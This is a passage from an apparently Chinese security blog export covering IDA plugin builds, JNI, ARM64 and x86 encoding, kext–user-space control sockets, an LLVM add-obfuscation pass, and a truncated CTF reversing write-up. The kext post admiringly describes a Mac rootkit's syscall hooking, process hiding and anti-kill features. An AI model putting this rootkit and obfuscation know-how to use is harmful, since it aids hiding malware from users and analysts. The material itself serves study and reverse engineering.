32位，因此插件同样为64位的dylib。不仅这样，SDK上某些接口也发生了改变，导致很多优秀的插件不得不重新改动源码，很多在IDA7上编译也存在问题。下面我将以IDA的官方插件findcrypt2来说明IDA7的插件编译细节。编译IDA插件是个麻烦事，主要在于网上相关的资料很少，唯一的几篇也是年代久远，Makefile里面很多编译参数都有变化，目前来说，没有一个完整的文章来介绍如何在Mac平台下编译IDA插件的指南。希望这边文章能够对有这需求的人有所帮助。 搭建xcode环境在Mac上完全可以用xcode来帮助我们编译IDA插件，其实更常见的是用Makefile编译，但原理一样，所以这里就以xcode来介绍。 我们知道IDA的插件的文件格式为dylib动态库，因此在创建xcode项目时在Framework&amp;Libarry中选择Libarry 然后再选择为Dynamic动态库，并导入C++标准库 接下来项目中自动会生成两个文件。暂时不用管，我们把findcrypt2的源码放入该项目，最后如下图所示 这时你的项目中像ida.hpp这类的头文件肯定会提示找不到，还需要进一步设置。 Build setting这里我们将设置头文件和库的搜索路径等等。 首先设置目标架构为x86_64 然后设置头文件和库的搜索路径，依据你IDA及sdk路径改成对应路径 经过上面的设置，此时xcode应该能找到头文件了，这时还需要设置连接的静态库 这里连接的库为-lida64，表示我们编译的是解析64位的插件，若要编译解析32位的插件，这里为-lida即可。 最后我们还需要设置编译参数 其中__EA64__在编译64位插件时才有。 这时候build一下，如果一切顺利，应该就不会报错了。 最后说两句IDA7相以前版本而言，插件的后缀名统一为dylib格式，之前32位为pmc，64位为pmc64。这里将编译好的插件改为findcrypt264.dylib表示为64位插件，则对应的32位插件名为findcry.dylib 下面测试下效果，我们打开IDA去解析一个含有md4加密的macho文件，运行插件测试能否识别出其中的加密算法。 上图我们可以看到这里成功找到一处md4加密，反汇编窗口中正是md4加密中用到的常量数组。我顺便为插件注册了Ctrl-Alt-z的快捷键，若没有快捷键，可以在插件的导航栏里点击对应的插件即可。 完附上该插件，完。 findcrypt264.dylib_for_ida7_made_by_x1a0 参考链接 http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/ https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile ​","tags":[{"name":"ida","slug":"ida","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ida/"}]},{"title":"Android JNI踩坑笔记","date":"2017-11-28T09:00:20.000Z","path":"2017/11/28/Android_JNI_掉坑笔记 /JNI/","text":"最近项目需要用到jni去实现一些功能，在原生层调用java层的过程中，踩了很多坑，这里做个记录，方便以后查阅，以及如果遇到一些错误，看看有没有这里的坑。 坑1–jni方法签名分号问题这是一个很常见的问题，第一次写jni中方法签名的时候很容易遇到这个错误，比如下面这个签名 jmethodID equals_id = env-&gt;GetMethodID(string_c, &quot;equals&quot;, &quot;(Ljava/lang/Object;)Z&quot;); 切记当参数或者返回值不是基本类型的时候一定要在末尾加上分号。 jmethodID iterator_id = env-&gt;GetMethodID(list_c,&quot;iterator&quot;,&quot;()Ljava/util/Iterator;&quot;); 这类错误常见描述为方法找不到错误。如果遇到类方法找不到切记先检查方法签名是否正确。 坑2–原生方法包含默认2个参数这个坑当然是对jni使用不熟练造成的，未了解其特性，所以对于初学者来说容易犯。看一个原生函数 static jboolean nativeFunction(JNIEnv *env, jobject content, jobject someObj){...} 第一个保留参数为JNIEnv虚拟机环境变量，第二个为调用该原生方法的java类对象即上下文。这里多说一句，第二个参数的上下文需根据该方法为静态方法还是实例方法，若为静态方法，则这里上下文为类引用；若为实例方法，则上下文为该类的对象引用。若把类引用当做对象引用，在查找方法id时则会出现方法找不到错误。 由于很多时候不声明这两个参数同样能正确运行（无其他参数时）导致忽略了第二个参数的存在，以为第二个上下文参数为传入的对象引用。 这类错误常见描述为当你在某处调用这个对象的方法时，会提示找不到该方法。因为这个对象根本不是你传入的对象。 坑3—jni调用父类方法的正确姿势这里就以一个正确的调用父类方法的流程来讲，起因是当我在查找Exception这个类的getStackTrace 方法时提示方法找不到错误，调了会才发现这个方法是在其父类Throwable中，所以正确的写法为： jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;); jclass throwable_c = env-&gt;FindClass(&quot;java/lang/Throwable&quot;); jmethodID getStackTrace_id = env-&gt;GetMethodID(throwable_c, &quot;getStackTrace&quot;,&quot;()[Ljava/lang/StackTraceElement;&quot;); 那么怎么调用呢？用CallNonvirtual&lt;XXX&gt;Method去调用父类中的方法，一个调用例子： jobjectArray stes = (jobjectArray)env-&gt;CallNonvirtualObjectMethod(excep, throwable_c, getStackTrace_id); 这里需要传入三个参数，第一个为子类的对象引用，第二个为父类类引用，第三个为方法id。 坑4—其他小坑写jni代码时最大的麻烦在于要写很多代码去定位java中的类和方法，java中一个很简单的调用，在jni层写时或许要写很大一堆，这也不奇怪，因为没有了Android虚拟机，这些本来由虚拟机做的事必须得手动去完成。在写jni层代码时，还有一些小的错误，比如jstring与char*的转换，LOGE()函数中参数为char*的字符串。当然还有一些java与C语言类型对应的问题就不多说了，自己翻下jni.h头文件就能找到。 还有个AndroidStudio的bug在于不能正确的解析jni等头文件，虽然不影响编译，但没有了代码提示以及显示红色看着也挺难受的。网上找到一个解决办法，在对应的build.gradle文件中在defaultConfig{}加入下面的脚本： sourceSets.main{ jni.srcDirs &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-mips/usr/include&#39; jniLibs.srcDir &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-arm/usr/lib&#39; } 无非是手动指定了jni相关的文件路径。 关于下面两类写法： jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;); jclass exception_c = (*env)-&gt;FindClass(env, &quot;java/lang/Exception&quot;); 原因在于C++和C的两种写法，可以在文件中宏定义为C++的即可。 完说了这些坑，当然我都踩过，由于刚接触Android jni特性。所以踩了很多坑，尤其是Android不像iOS那样容易debug，多了一层虚拟机导致很多错误不好调式。说到这，还要吐槽下AndroidStudio的gradle这个项目管理器，各种版本或者莫名奇怪的错误，虽然Xcode同样不是很好用，但相比之下，Xcode省心多了。 继续踩坑去了…","tags":[{"name":"android","slug":"android","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"}]},{"title":"ARM64基础知识整理","date":"2017-10-21T10:07:00.000Z","path":"2017/10/21/ARM64基础知识整理/ARM64基础知识整理/","text":"ARM64基础知识整理Register参数寄存器 (X0-X7)参数寄存器，在函数调用的时候传参使用。X0-X7分别对应8个参数，多于8个的参数保存在栈中。 其他特殊寄存器 X29(FP) 栈帧寄存器 类比x64中rbp X30(LR) 链接寄存器，保存函数返回地址，x64该地址保存在栈中 SP 栈顶寄存器，类比x64中 PC 指向下一条指令 寄存器 描述 CPSR 状态寄存器 Instructions mov mov x0, x1; copies x1 into x0 mov x1, 0x4141; loads the value 0x4141 in x1 str/ldr str x0, [x29]; store x0 at the address in x29 ldr x0, [x29]; load the value from the address in x29 into x0 stp/ldp stp x29, x30, [sp]; store x29 at sp and x30 at sp+8 b/br br x0; jump to the address stored in x0 ret Unlike it’s x86 equivalent which pops the return address from stack, it looks for the return address in the x30 register and jumps there. Indexing modes Immediate offset : [base, #offset] - Index an offset directly and don’t mess with anything else ldr x0, [sp, 0x10]; load x0 from sp+0x10 Pre-indexed : [base, #offset]! - Almost the same as above, except that base+offset is written back into base. ldr x0, [sp, 0x10]!; load x0 from sp+0x10 and then increase sp by 0x10 Post-indexed : [base], #offset - Use the base directly and then write base+offset back into the base ldr x0, [sp], 0x10; load x0 from sp and then increase sp by 0x10 函数调用demo分析__text:000000010004F0D4 SUB SP, SP, #0x70 __text:000000010004F0D8 STP X24, X23, [SP,#0x60+var_30] __text:000000010004F0DC STP X22, X21, [SP,#0x60+var_20] __text:000000010004F0E0 STP X20, X19, [SP,#0x60+var_10] __text:000000010004F0E4 STP X29, X30, [SP,#0x60+var_s0] __text:000000010004F0E8 ADD X29, SP, #0x60 __text:000000010004F0EC MOV X19, X0 __text:000000010004F0F0 ADRP X8, #___stack_chk_guard_ptr@PAGE __text:000000010004F0F4 LDR X8, [X8,#___stack_chk_guard_ptr@PAGEOFF] __text:000000010004F0F8 LDR X8, [X8] __text:000000010004F0FC STR X8, [SP,#0x60+var_38] __text:000000010004F100 ADRP X8, #classRef_Fabric@PAGE __text:000000010004F104 LDR X20, [X8,#classRef_Fabric@PAGEOFF] __text:000000010004F108 NOP __text:000000010004F10C LDR X0, [X8,#classRef_Crashlytics@PAGEOFF] ; void * __text:000000010004F110 ADRP X8, #selRef_class@PAGE __text:000000010004F114 LDR X1, [X8,#selRef_class@PAGEOFF] ; char * __text:000000010004F118 BL _objc_msgSend ... __text:000000010004F2F4 LDP X29, X30, [SP,#0x60+var_s0] __text:000000010004F2F8 LDP X20, X19, [SP,#0x60+var_10] __text:000000010004F2FC LDP X22, X21, [SP,#0x60+var_20] __text:000000010004F300 LDP X24, X23, [SP,#0x60+var_30] __text:000000010004F304 ADD SP, SP, #0x70 __text:000000010004F308 RET 地址 栈值 描述 sp=sp-0x70 局部变量空间 sp-0x60 局部变量空间 sp-0x50 局部变量空间 sp-0x40 X24/X23 保存寄存器信息 sp-0x30 X22/X21 保存寄存器信息 sp-0x20 X20/X19 保存寄存器信息 X29 –&gt; sp-0x10 X29/X30 保存前栈基址和返回地址 sp=sp 调用前的栈顶地址 参考 https://www.jianshu.com/p/2f4a5f74ac7a https://wiki.cdot.senecacollege.ca/wiki/Aarch64_Register_and_Instruction_Quick_Start https://blog.perfect.blue/ROPing-on-Aarch64","tags":[{"name":"ARM64","slug":"ARM64","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ARM64/"}]},{"title":"X86指令编码笔记","date":"2017-10-11T03:46:13.000Z","path":"2017/10/11/x86指令编码笔记/X86指令编码笔记/","text":"由于重装系统同步导致原文章消失，只能再写一遍，方便以后查阅。 x86指令编码格式很多时候我们都是查阅指令参考页去了解一个指令的含义，但这并不能理解指令的编码格式。而只有学会看懂opcode表的时候才是王道。 x86是一种CISC指令集，CISC的全称是“Complex Instruction Set Computer”，表示的是一种复杂的指令集，其中一个最重要的复杂性在于在这个指令集中，指令是不定长的，要使得CPU在这种不定长的指令集里面确定每一条指令的含义，就需要一种特定的指令格式，下图显示了Intel 64和IA-32架构下的指令格式，当然，这两种架构所采用的都是x86指令编码： 从上面可以看出，x86指令格式中，由6部分组成，但在这之中只有opcode是必须的，其余都是可选。我们稍后就介绍这些组成部分。 指令prefixprefix简单的说来就是调整内存操作数属性，增强指令的作用等。 lock 和 repeat 其中，LOCK prefix保证该条指令对共享内存的访问是独占的；而repeat prefixes 表示这条指令会重复执行多次，直到某个条件满足位置。其中第二种repeat prefix只能用在对string的操作，或者对I/O的操作上。 operand-size override （66H — 改变默认操作数大小） 这个prefix主要是在解析指令的操作数的时候，可以在十六位或者三十二位的操作数大小间进行切换。 address-size override （67H — 改变默认操作数地址大小） 这个prefix主要是在进行指令寻址的时候，可以在十六位或者三十二位的地址大小中进行切换。 segment override，branch hints 和 bound 其中，segment override prefix会在执行这条指令的时候将默认的段寄存器给换掉；branch hints prefix主要应用在条件跳转指令（Jcc）中，可以协助CPU进行指令的prefetch；而bound prefix主要是用intel MPX硬件特性上。 ​ | 2E | 3E | 26 | 64 | 65 | 36 || ———– | ———– | ———– | ———– | ———– | ———– || CS register | DS register | ES register | FS register | GS register | SS register | REX prefix—开启 64 位计算的基石REX prefix 是不定值，它的取值范围是：40 - 4F （共 16 个） 7 6 5 4 3 2 1 0 0 1 0 0 W R X B W: operand width 标志位，当 W = 0 时使用 default operand size,当 W = 1 时使用 64 位 operand size R: 用来扩展 ModRM.reg 域 X: 用来扩展 SIB.index 域 B: 用来扩展 SIB.base, ModRM.r/m 以及 Opcode.reg 寄存器编码表 下面来分析这条指令： mov eax,ebx 正常编码为：89 d8 下面看看在不同的REX.W和66H prefix下的不同： 48 89 d8——————&gt; mov rax,rbx 66 48 89 d8—————&gt; mov rax,rbx 66 40 89 d8—————&gt; mov ax, bx ​ 第 1 条指令编码使用 REX prefix 扩展访问 64 位寄存器，REX.W = 1 第 2 条指令编码加上了 66H prefix 同时还有 REX prefix（REX.W = 1），此时一般会认为产生了冲突：是使用 64 位还是 16 位 operand size 呢？实际上，很简单！48H 位于 66H 后面，66H 将被覆盖！也就是说：66H prefix 将会被忽略，REX prefix 产生了作用！因此：指令的 operand size 是 64 位的。 第 3 条指令编码也同样使用了 66H prefix 和 REX prefix，但是 REX.W = 0 意味着不改变原来的 operand size！在这种情况下，REX prefix 不会与 66H prefix 产生冲突，最终的作用于 66H prefix，因此 operand size 是 16 位的。 opcode整个编码中opcode是必须的，因为代表着这条指令的含义，整个指令的核心，且prefix与Opcode共享00~FF的空间。 一个opcode可以由一个byte组成，我们称之为1-byte opcode，当然，与之对应的，就有2-bytes opcode和3-bytes opcode。其中，后两者一般会有一个被称为escape opcode的byte进行引导，该byte的数值是0FH。所以，一般情况下，2-bytes opcode就是0FH后面再加一个byte，而3-bytes opcode就是0FH后面再加两个bytes。 ModR/MModRM在指令中非常重要，是理解x86平台opcode的关键，决定着寻址模式。 由一个byte组成，其格式如下： 7 6 5 4 3 2 1 0 mod reg R/M 1、mod：寻址模式。 2位组成4种寻址模式，总的来说，只有两种寻址模式，就是：内存寻址模式和寄存器寻址模式。 mod = 11指出寄存器寻址模式，mod = 00 ~ 10 时指出内存寻址模式： mod = 00，定义 [register] 间接寻址，无displacement值。 mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。 mod = 10，定义 [register + disp32]，有32位displacement偏移值。 2、reg：寄存器ID值 3位组成8个寄存器ID值，从 000 ~ 111，对应于 RAX、RCX、RDX、RBX、RSP、RBP、RSI以及RDI。这个ID值可以被REX prefix扩充为4位，范围从 0000 ~ 1111可表示16个寄存器。 reg域的另一含义是对Opcode的补充，对分为一组Opcode的进行选择（Group属性）。 3、r/m：意即register / memory。 ​ 提供对registers或memory的寻址，也用来表示寄存器ID，当是registers时是寄存器ID值。当是memory时是寄存器间接寻址中的寄存器ID值。当mod != 11 时，r/m 表示 [rax] ~ [rdi]，REX prefix用来扩充寄存器ID值。 注意: (1) 如果像这条指令：mov eax, [eax+ecx2+0x0c] 在这条指令里eax是base寄存器，ecx是Index寄存器，2是scale，还有一个displacement ,这种内存寻址是base+indexscale+disp。这需要SIB字节来进行确定，那么ModRM必须要有一个手段来引出后续的SIB字节。在 [rax] ~ [rdi] 的范围里，Intel选择了原来应属于 [rsp] 的值用来引出SIB，一是因为 [rsp] 并不常用吧。二是因为 rsp 设计为 stack top指针，专用于stack top指针。 原来属于 [rsp] 的领域对应的，r/m是100，这个领域被 [SIB] 替代了，事实上在16位机器原本是没有SIB字节的，base+index*scale+disp这种寻址是后来才增加的。16位的ModRM上是没有SIB引导域。 (2)如果内存寻址中没有base和index，只有disp的话，如：mov ebx, [0x11223344]，这种直接寻址方式，在设计上ModRM还必须为提供这个模式。 Intel又作出修改，选择了原来属于 [rbp] 模式的领域提供给 [disp]，选择 [rbp] 让给 [disp]，是因为 rbp 原本意图就是设计为 stack基址指针。[rbp] 寻址一般都要加上一个偏移量，也就是基于stack frame指针的偏移量，即 [ebp + disp] 这种寻址模式在 mod = 01 或 mod = 10 中给出。 SIBSIB意即：Scale – Index – Base，用来定义base+index*scale+disp这种寻址模式。同样按2-3-3比例组合。 7-6 5-4-3 2-1-0 scale index base index 域指出index寄存器的ID值，范围从 000 ~ 111。base 域指出base寄存器的ID 值，从 000 ~ 111。Index与base经过 REX prefix可以扩展为0000 ~ 1111。 Displacement 和 Immediate某些指令会在最后要求有一个用于计算内存地址的值，或者一个立即数。很明显，不多说。 综合起来，看下面的例子： 49 8b 7d 00 49=0100 1001对应REX prefix,默认64为size模式 8b= mov opcode 7d=01 111 101—&gt;ModR/M mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。rdi ,r13 00=Displacement = 0 所以指令= mov rdi,QWORD PTR [r13+0]—&gt;mov rdi,[r13] ​ 参考及索引http://ref.x86asm.net/coder32.html —-&gt; 查阅opcode http://pnx.tf/files/x86_opcode_structure_and_instruction_overview.png —&gt;quick look Intel x86 Assembler Instruction Set Opcode Table http://www.mouseos.com/x64/index.html https://bbs.pediy.com/thread-78121.htm X86指令编码的那些事儿 http://subler.github.io/note/compiler/x86_instruction_encode.html onlineDisassembler","tags":[{"name":"x86","slug":"x86","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/x86/"}]},{"title":"一种用户层与kext内核扩展交互方式","date":"2017-08-10T07:59:00.000Z","path":"2017/08/10/一种用户层与kext内核扩展交互方式/一种用户层与kext内核扩展交互方式/","text":"最近在学习一个Mac平台上开源的rootKit框架，里面确实有很多干货，本文就来分析其中与用户层交互的部分。简单说下rootKit原理：利用kext驻留在内核，完成实际的各种功能：sys_ptrace过滤 PT_DENY_ATTACH反调试hook系统调用防止sys_kil（很强大有木有）隐藏自身进程，文件监控，网络监控，提权等等可谓是相当可怕。这些功能都可以通过一个用户进程来控制，所以这里必须有一种机制来提供kext与用户层的交互方式，这就是本文重点。 0x01 一个例子进入kext开发在这之前，简单的用一个例子来学习下kext开发。下面关于xcode中的操作都很明显，故忽略。 打开xcode创建一个Generic Kernel Extension工程，完成之后会出现一个kext模板，如下 #include &lt;mach/mach_types.h&gt; #include &lt;libkern/libkern.h&gt; kern_return_t TestExtension_stop(kmod_info_t *ki, void *d); kern_return_t TestExtension_start(kmod_info_t * ki, void *d) { printf(&quot;hello kext!\\n&quot;); return KERN_SUCCESS; } kern_return_t TestExtension_stop(kmod_info_t *ki, void *d) { printf(&quot;bye kext!\\n&quot;); return KERN_SUCCESS; } 其中这两个函数分别在内核扩展加载和卸载时调用，比如上面我们只是打印一行hello kext，这句话就会在这个kext加载是打印出来（在系统日志中查看）你可能会有疑惑，系统如何知道是这两个函数的，这个是在工程中设置的，你可以改变成任何函数都是OK的。 简单编译一下，然后找到编译后的kext文件，输入命令改变权限 sudo chown -R root:wheel TestExtension.kext 再输入 sudo kextload TestExtension.kext 加载内核扩展，如果一切没错的话，这时你在系统日志中就会出现hello kext这句话。同理你可以输入下面的命令 sudo kextunload TestExtension.kext 来卸载该内核扩展，你同样会看到bye kext这句话。 0x02 用户层与内和扩展间的交互下面要介绍的是一种类似于socket机制的交互机制，通常kext在加载的时候会建立一个socket服务器，然后用户层程序去打开这个socket（使用PF_SYSTEM协议）。接下来kext就会处理来至用户端的命令。下面同样通过一个例子来表明他们之间的交互，这里分为kext和客户端两部分。 kext 示例代码#include &lt;sys/systm.h&gt; #include &lt;mach/mach_types.h&gt; #include &lt;mach/kern_return.h&gt; #include &lt;sys/kern_control.h&gt; //#include &lt;SOMEWHERE YOU CAN GET STRNCPY IN THE KERNEL FROM&gt; char name[] = &quot;com.example.mymodule&quot; ;//标识这个kext struct kern_ctl_ref _ctlref ; kern_return_t start(kmod_info_t *info, void *data) { int err ; struct kern_ctl_reg ctlreg ; bzero(&amp;ctlreg, sizeof(ctlreg)) ; //控制信息 ctlreg.ctl_id = 0 ; /* 请求分配一个动态id */ ctlreg.ctl_unit = 0 ; strncpy(ctlreg.ctl_name, name, sizeof(ctlreg.ctl_name)); //回调函数 ctlreg.ctl_connect_func = connect ; ctlreg.ctl_disconnect_func = disconnect ; ctlreg.ctl_send_func = send ; ctlreg.ctl_getopt_func = getopt ; ctlreg.ctl_setopt_func = setopt ; //注册内核控制 err = ctl_register(&amp;ctlreg, &amp;_ctlref) ; if (err) return KERN_FAILURE ; return KERN_SUCCESS ; } 下面解释下其中的kern_ctl_ref数据结构 struct kern_ctl_reg { /* 控制信息 */ char ctl_name[MAX_KCTL_NAME]; u_int32_t ctl_id; u_int32_t ctl_unit; /* 控制设置 */ u_int32_t ctl_flags; u_int32_t ctl_sendsize; u_int32_t ctl_recvsize; /* 回调函数 */ ctl_connect_func ctl_connect;//建立连接时调用 ctl_disconnect_func ctl_disconnect;//断开连接时调用 ctl_send_func ctl_send;//处理从client到kernel的数据发送 ctl_setopt_func ctl_setopt; //当client调用setsockopt时调用 ctl_getopt_func ctl_getopt;//当client调用getsockopt时调用 }; client 示例代码#include &lt;socket.h&gt; #include &lt;string.h&gt; #include &lt;sys/kern_control.h&gt; #include &lt;sys/ioctl.h&gt; char name[] = &quot;com.example.mymodule&quot; ;//标识这个kext static int g_socket = -1; u_int32_t getctlidbybame(int sock, char *name) ; //建立连接 int socket_ctl(char *name) { int g_sock = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL) ; if (g_sock == 0) return 0 ; u_int32_t id = getctlidbyname(g_sock, name) ; sockaddr_ctl addr ; addr.sc_len = sizeof(addr) ; addr.sc_family = AF_SYSTEM ; addr.sc_sysaddr = AF_SYS_CONTROL ; addr.sc_id = id ; addr.sc_unit = 0 ; /* allocate dynamically */ int err ; err = connect(g_sock, (struct sockaddr*)&amp;addr, sizeof(addr)) ; if (err) return 0 ; return sock ; } u_int32_t getctlidbybame(int sock, char *name) { struct ctl_info info ; memset(&amp;info, 0, sizeof(info)) ; strncpy(info.ctl_name, name, strlen(name)) ; int err = ioctl(sock, CTLIOCGINGO, &amp;info) ; if (err) return 0 ; /* should do something stronger here! */ return info.ctl_id ; } int main(int argc, const char *argv[]) { socket_ctl(name); } //发送数据 void execute_cmd(int cmd, char *args) { char data[32] = { 0 }; size_t data_len = 0; int retv; if(args != NULL) { memcpy(data, args, strlen(args)); } data_len = strlen(data) + 1; retv = setsockopt(g_socket, SYSPROTO_CONTROL, cmd, (void *)data, (socklen_t)data_len); if(retv != 0) { printf(&quot;[ERROR] Kernel command execution failed:\\n&quot;); printf(&quot;\\t%s (%d)\\n&quot;, strerror(errno), errno); return; } } //接收数据 void get_data() { char *data = malloc(32); socklen_t data_len = 32; int retv = getsockopt(g_socket, SYSPROTO_CONTROL, 0, data, &amp;data_len); if(retv != 0) { printf(&quot;[ERROR] getsockopt()\\n&quot;); return; } size_t r = recv(g_socket, data, data_len, 0); if(r == 0) { printf(&quot;[ERROR] recv()\\n&quot;); return; } } 代码不是很复杂，先通过kext名去获取一个id建立一个socket，然后通过这个socket去发送和接受kext的数据。 0x03 总结在这个rootKit框架中还有很多可以挖掘的东西，里面hook系统调用来达到反kill等功能很是实用，以及一些内核操作手段都值得学习和借鉴，待续… 0x04 参考 http://www.tanhao.me/pieces/1515.html/ https://urchin.earth.li/~twic/Kernel_Extensions_for_OS_X.html https://github.com/enzolovesbacon/inficere","tags":[{"name":"kext","slug":"kext","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/kext/"}]},{"title":"初-LLVM的代码混淆","date":"2017-06-25T07:09:13.000Z","path":"2017/06/25/初-LLVM的代码混淆/初-LLVM的代码混淆/","text":"0x00 目录 断断续续的学习了一段时间的LLVM，记录下学习进度，随着后面的学习待更新 LLVM简介 一个基于LLVM简单的代码混淆例子 参考链接 0x01 LLVM简介LLVM(low level virtual machine)是一个先进的编译器框架，它提供了一种代码编写良好的中间表示(IR)，可以作为多种语言的后端，还可以提供与变成语言无关的优化和针对多种cpu的代码生成功能。LLVM的主要架构如下： 前端：前端用来获取源代码然后将它转变为某种中间表示，我们可以选择不同的编译器来作为LLVM的前端，如gcc，clang。 Pass：Pass是LLVM优化工作的一个节点，一个节点做些事，一起加起来就构成了LLVM完整的优化和转化。 后端：后端用来生成实际的机器码，一般情况下不会关注这一部分。 LLVM框架：这里与传统的编译器不同，LLVM采用了一种统一的中间表示： 安装与使用首先下载LLVM $ cd where-you-want-llvm-to-live $ svn co http://llvm.org/svn/llvm-project/llvm/trunk llvm 我们选择clang作为LLVM前端，然后下载clang $ cd where-you-want-llvm-to-live $ cd llvm/tools $ svn co http://llvm.org/svn/llvm-project/cfe/trunk clang 下载编译运行库 $ cd where-you-want-llvm-to-live $ cd llvm/projects $ svn co http://llvm.org/svn/llvm-project/compiler-rt/trunk compiler-rt 最后编译LLVM源码 $ mkdir build $ cd build $ cmake -DCMAKE_BUILD_TYPE:String=Release ../llvm/ $ make 编译时间可能有点长，编译完成之后进行安装 $sudo make install 接下来就是LLVM的使用，先创建一个hello.c源文件 #include &lt;stdio.h&gt; int main(){ printf(&quot;hello LLVM\\n&quot;); return 0; } 0x02 一个基于LLVM简单的代码混淆例子Pass是LLVM中一个很重要的部分，每个Pass都是做优化或者转换的工作，LLVM的优化和转换工作就是由很多个Pass一起完成的。我们通过继承指定的类以及实现相关的虚函数来实现具体的Pass，具体的类型主要有以下几种： ImmutablePass MoudlePass CallGraphSCCPass FuncationPass LoopPass RegionPass BasicBlockPass MachineFunctionPass 下面这个例子来介绍一下pass的编写并达到简单的混淆。从这里下载这个模板llvm-pass-skeleton 下面是完整代码： #include &quot;llvm/Pass.h&quot; #include &quot;llvm/IR/Function.h&quot; #include &quot;llvm/Support/raw_ostream.h&quot; #include &quot;llvm/IR/LegacyPassManager.h&quot; #include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot; #include &quot;llvm/IR/Intrinsics.h&quot; #include &quot;llvm/IR/Instructions.h&quot; using namespace llvm; namespace { struct SkeletonPass : public FunctionPass { static char ID; SkeletonPass() : FunctionPass(ID) {} // virtual bool runOnFunction(Function &amp;F) { // errs() &lt;&lt; &quot;I saw a function called &quot; &lt;&lt; F.getName() &lt;&lt; &quot;!\\n&quot;; // return false; // } bool runOnFunction(Function &amp;F) override { Function *tmp = &amp;F; // 遍历函数中的所有基本块 for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) { // 遍历基本块中的每条指令 for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) { // 是否是add指令 if (inst-&gt;isBinaryOp()) { if (inst-&gt;getOpcode() == Instruction::Add) { ob_add(cast&lt;BinaryOperator&gt;(inst)); } } } } return false; } // a+b === a-(-b) bool ob_add(BinaryOperator *bo) { BinaryOperator *op = NULL; if (bo-&gt;getOpcode() == Instruction::Add) { // 生成 (－b) op = BinaryOperator::CreateNeg(bo-&gt;getOperand(1), &quot;&quot;, bo); // 生成 a-(-b) op = BinaryOperator::Create(Instruction::Sub, bo-&gt;getOperand(0), op, &quot;&quot;, bo); op-&gt;setHasNoSignedWrap(bo-&gt;hasNoSignedWrap()); op-&gt;setHasNoUnsignedWrap(bo-&gt;hasNoUnsignedWrap()); } // 替换所有出现该指令的地方 bo-&gt;replaceAllUsesWith(op); } }; } char SkeletonPass::ID = 0; // Automatically enable the pass. // http://adriansampson.net/blog/clangpass.html static void registerSkeletonPass(const PassManagerBuilder &amp;, legacy::PassManagerBase &amp;PM) { PM.add(new SkeletonPass()); } static RegisterStandardPasses RegisterMyPass(PassManagerBuilder::EP_EarlyAsPossible, registerSkeletonPass); 通过继承FunctionPass重写虚函数runOnFunction来到达我们代码混淆的目的，再看关键的混淆部分，如下面注释那样，找到函数中的add指令，并将其改为sub指令。如a+b经过混淆为a-(-b) bool runOnFunction(Function &amp;F) override { Function *tmp = &amp;F; // 遍历函数中的所有基本块 for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) { // 遍历基本块中的每条指令 for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) { // 是否是add指令 if (inst-&gt;isBinaryOp()) { if (inst-&gt;getOpcode() == Instruction::Add) { ob_add(cast&lt;BinaryOperator&gt;(inst)); } } } } return false; } 代码很简单，这里就不多说。我们使用 $clang -Xclang -load -Xclang build/skeleton/libSkeletonPass.* something.c 来运行这个pass编译成目标可执行文件现在我们创建一个addTest.c文件来测试是否代码混淆 #include &lt;stdio.h&gt; int func(int a,int b) { return a + b; } int main() { int c; c = func(6,9); printf(&quot;%d\\n&quot;,c); return c; } 先按照一般的编译源代码，查看关键汇编代码：然后运行我们的pass进行编译很明显，汇编代码发生了改变，当然这里仅仅是一个简单的混淆，感兴趣的可以研究下obfuscator-llvm这个项目。 0x03 参考链接深入剖析 iOS 编译 Clang / LLVMhttp://zke1ev3n.me/2016/01/18/%E5%9F%BA%E4%BA%8ELLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/","tags":[{"name":"LLVM","slug":"LLVM","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLVM/"},{"name":"obfuscation","slug":"obfuscation","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/obfuscation/"}]},{"title":"pwnhub-CTF re150","date":"2017-05-28T01:16:13.000Z","path":"2017/05/28/pwnhub-CTF-re150/pwnhub-CTF-re150/","text":"0x00 写在前面第一次做pwnhub题，最近参加了几场ctf比赛，pwnhub的题还是比较有一定难度的，这里记录下其中的一道逆向题。题目在这里 0x01 简单分析拿到题目后试着在虚拟机里运行了一下，看下有什么提示 然后转去hopper搜下相关字符串，并没有发现error相关字符串，syclover也没有相关printf等函数输出，看来只能上gdb调试看看。 发现程序里面有多处花指令以及隐藏了程序入口。 由上图可以发现syclover直接由int 0x80系统调用中断输出到屏幕，下面是一个循环解密，后面可知解密的正是程序的入口。 由__libc_start_main函数可得第一个参数即为main函数地址这里作为对比，可以看下hopper中对0x8048320main函数的解析完全不知道是什么有木有？所以拿到题如果放到IDA之类的反汇编工具根本看不出什么线索 接下来所做的事就是获取输入的字符串然后进行加密，然后与程序里的字符串加密比较，具体看后面的代码。 0x02 修复程序根据上面的分析，我们将程序进行修复 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;assert.h&gt; #include &lt;elf.h&gt; #define ENTRY 0x08048320 #define FILE_OFF 0x320 #define COUNT 0x432 int main(int argc,char *argv[]){ Elf32_Ehdr ehdr; unsigned char 